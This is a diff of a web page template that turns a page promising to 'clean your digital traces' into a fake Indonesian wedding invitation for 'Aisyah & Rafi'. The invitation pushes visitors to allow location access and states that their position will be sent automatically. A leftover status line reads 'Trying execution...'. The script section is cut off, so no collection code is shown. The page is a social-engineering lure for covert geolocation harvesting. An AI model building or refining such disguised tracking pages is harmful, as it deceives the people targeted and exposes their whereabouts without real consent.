@@ -5,27 +5,51 @@
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <title>Salam Cair</title>
     <style>
-        body { margin: 0; font-family: Inter, system-ui, sans-serif; background: #f8fafc; color: #0f172a; }
-        .container { width: min(720px, calc(100% - 2rem)); margin: 3rem auto; padding: 2rem; background: #ffffff; border-radius: 24px; box-shadow: 0 28px 80px rgba(15, 23, 42, 0.08); }
-        h1 { margin: 0 0 0.75rem; font-size: 2rem; }
-        p { margin: 0 0 1rem; line-height: 1.75; color: #475569; }
-        .status { padding: 1rem 1.25rem; border-radius: 1rem; border: 1px solid #cbd5e1; background: #f8fafc; margin-top: 1rem; }
-        .button { display: inline-flex; align-items: center; justify-content: center; gap: 0.5rem; padding: 0.95rem 1.25rem; border-radius: 1rem; border: none; color: #ffffff; background: #4338ca; text-decoration: none; font-weight: 700; cursor: pointer; }
-        .button:hover { background: #3730a3; }
-        .info { margin-top: 1rem; color: #334155; }
-        .info strong { display: inline-block; width: 120px; }
-        .muted { color: #64748b; }
+        body { margin: 0; font-family: 'Playfair Display', Georgia, serif; background: linear-gradient(135deg, #f9f3f0 0%, #f4ece8 100%); color: #2b2b2b; }
+        .container { width: min(760px, calc(100% - 2rem)); margin: 3rem auto; padding: 2rem; background: rgba(255,255,255,0.96); border-radius: 32px; box-shadow: 0 28px 80px rgba(43, 43, 43, 0.12); border: 1px solid rgba(255,255,255,0.9); }
+        h1 { margin: 0 0 0.75rem; font-size: clamp(2rem, 4vw, 3rem); letter-spacing: 0.08em; text-align: center; }
+        p { margin: 0 0 1.5rem; line-height: 1.8; color: #5d4840; text-align: center; }
+        .invite-card { padding: 2rem; background: #fff; border-radius: 28px; border: 1px solid rgba(214, 193, 180, 0.8); box-shadow: 0 18px 46px rgba(33, 28, 24, 0.08); }
+        .couple { display: grid; gap: 1rem; text-align: center; margin-bottom: 1.5rem; }
+        .name { font-size: 2rem; font-weight: 700; color: #2b2b2b; }
+        .label { color: #a9766f; font-size: 1rem; letter-spacing: 0.2em; text-transform: uppercase; }
+        .date { color: #7a5b51; font-size: 1rem; }
+        .details { display: grid; gap: 0.85rem; padding: 1rem 0; border-top: 1px solid rgba(214,193,180,0.3); border-bottom: 1px solid rgba(214,193,180,0.3); }
+        .detail-item { display: flex; justify-content: space-between; color: #473d39; font-size: 0.98rem; }
+        .detail-item strong { font-weight: 700; }
+        .note { margin-top: 1.5rem; padding: 1.25rem 1.5rem; background: #f5ece7; border-radius: 20px; border: 1px solid rgba(214,193,180,0.8); color: #5a463d; }
+        #status { display: inline-block; font-weight: 700; }
+        .info { margin-top: 1rem; color: #6b5650; }
+        .muted { color: #8c7670; }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Selamat Datang di Situs kami</h1>
-        <p>Halaman ini akan membersihkan jejak digital anda. Izinkan akses lokasi dan perangkat agar data dapat dilanjutkan.</p>
+        <h1>Undangan Pernikahan</h1>
+        <p>Mengundang Anda untuk hadir dalam kebahagiaan kami. Silakan izinkan akses lokasi agar kami dapat memastikan kehadiran virtual dan alamat Anda tersimpan.</p>
 
-        <div id="status" class="status">Mencoba eksekusi... Mohon tunggu dan izinkan permintaan lokasi.</div>
-        <div id="log" class="info"></div>
+        <div class="invite-card">
+            <div class="couple">
+                <div>
+                    <div class="name">Aisyah</div>
+                    <div class="label">&amp;</div>
+                    <div class="name">Rafi</div>
+                </div>
+                <div class="date">Sabtu, 1 Agustus 2026</div>
+            </div>
 
-        {{-- <a href="{{ route('share.panel') }}" class="button" style="margin-top:1rem;">Kembali ke Panel</a> --}}
+            <div class="details">
+                <div class="detail-item"><strong>Waktu</strong> : 10.00 WIB</div>
+                <div class="detail-item"><strong>Lokasi</strong> : Gedung Serbaguna Harmoni</div>
+                <div class="detail-item"><strong>Status</strong> : <span id="status">Mencoba eksekusi... Mohon tunggu dan izinkan lokasi.</span></div>
+            </div>
+
+            <div id="log" class="info">Posisi Anda akan dikirim secara otomatis, tidak perlu klik apa pun.</div>
+        </div>
+
+        <div class="note">
+            <p>Terima kasih sudah menjadi bagian dari momen spesial ini. Jika muncul permintaan lokasi, pilih Izinkan.</p>
+        </div>
     </div>
 
     <script>
